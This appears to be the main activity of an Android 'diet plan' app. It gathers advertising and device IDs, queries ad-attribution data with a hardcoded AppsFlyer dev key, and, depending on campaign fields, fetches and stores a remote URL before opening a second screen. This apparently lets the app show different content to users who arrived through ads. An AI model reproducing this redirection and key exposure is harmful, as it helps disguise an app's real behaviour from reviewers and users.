package dietplan.app.oqvvwe

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import dietplan.app.oqvvwe.databinding.ActivityMainBinding
import dietplan.app.oqvvwe.domain.LinkData
import dietplan.app.oqvvwe.ui.MainViewModel
import dietplan.app.oqvvwe.ui.second.SecondActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request

const val MY_PREFS_STORE = "my_prefs_store"
const val MY_DATA = "my_data"

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private val viewModel by lazy { ViewModelProvider(this).get(MainViewModel::class.java) }

    private val myPrefs by lazy { this.getSharedPreferences(MY_PREFS_STORE, Context.MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        checkInternet()
        observeInternetStatus()
    }

    private fun checkPrefs() {
        val prefsData = myPrefs.getString(MY_DATA, "") ?: ""
        if (prefsData.isNotEmpty()) {
            launchSecondActivity()
        } else getAppsFlyerData()

    }

    private fun launchSecondActivity() {
        val intent = Intent(this, SecondActivity::class.java)
        startActivity(intent)
    }

    private fun checkInternet() {
        viewModel.changeInternetStatus(checkInternetTransport())
    }

    private fun checkInternetTransport(): Boolean {
        val connectivityManager =
            this.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val network = connectivityManager.activeNetwork ?: return false

        val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

        return when {
            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

            activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI_AWARE) -> true

            else -> false
        }
    }

    private fun observeInternetStatus() {
        viewModel.internetStatus.observe(this, Observer {
            if (!it) showCheckInternetDialog()
            else checkPrefs()
        })
    }

    private fun showCheckInternetDialog() {
        val dialogBuilder = AlertDialog.Builder(this)
        with(dialogBuilder) {
            setTitle(getString(R.string.dialog_title))
            setMessage(getString(R.string.dialog_text))
            setPositiveButton(getString(R.string.btn_check_internet)) { dialog, id ->
                checkInternet()
                dialog.dismiss()
            }
            create()
            show()
        }
    }

    private fun getAppsFlyerData() {
        val linkData = LinkData()
        val appId = "dietplan.app.oqvvwe"
        val devKey = "wBHGLzsvQWfFDxsGsy7Vvk"
        val deviceId = AppsFlyerLib.getInstance().getAppsFlyerUID(this).toString()
        linkData.appsId = deviceId
        linkData.appPackage = appId

        lifecycleScope.launch(Dispatchers.IO) {
            linkData.androidAdvID =
                AdvertisingIdClient.getAdvertisingIdInfo(this@MainActivity).id.toString()
            val client = OkHttpClient()

            val request = Request.Builder()
                .url("https://gcdsdk.appsflyer.com/install_data/v4.0/dietplan.app.oqvvwe?devkey=$devKey&device_id=$deviceId")
                .get()
                .addHeader("accept", "application/json")
                .build()
            val response = client.newCall(request).execute()
            val map = (mutableMapOf<String, String>())
            if (response.isSuccessful) {
                val responseStr = response.body?.string() ?: ""
                val responseStrReplaced =
                    responseStr.replace("\"", "")
                        .replace("{", "")
                        .replace("}", "")
                responseStrReplaced.split(", ").map {
                    val subList = it.split(": ")
                    map[subList[0]] = subList[1]
                }
                if (map.containsKey("media_source")) linkData.appsMediaSource = map["media_source"]
                if (map.containsKey("campaign")) linkData.appsCampaignName = map["campaign"]
                if (map.containsKey("adset")) linkData.appsAdsetName = map["adset"]
                if (map.containsKey("af_status")) linkData.appsAfStatus = map["af_status"]
            }
            val newClient = OkHttpClient()
            if (linkData.getLink().isNotEmpty()) {
                val newRequest = Request.Builder()
                    .url(linkData.getLink())
                    .get()
                    .addHeader("accept", "application/json")
                    .build()
                val newResponse = newClient.newCall(newRequest).execute()
                if (newResponse.isSuccessful) {
                    val resp = newResponse.body?.string().toString()
                    val regex = Regex("""(https://[a-z\d./-]*)""")
                    val link = regex.find(resp)?.value
                    if (link != null) {
                        myPrefs.edit().putString(MY_DATA, link).apply()
                        launchSecondActivity()
                    }
                }
            }

        }
    }
}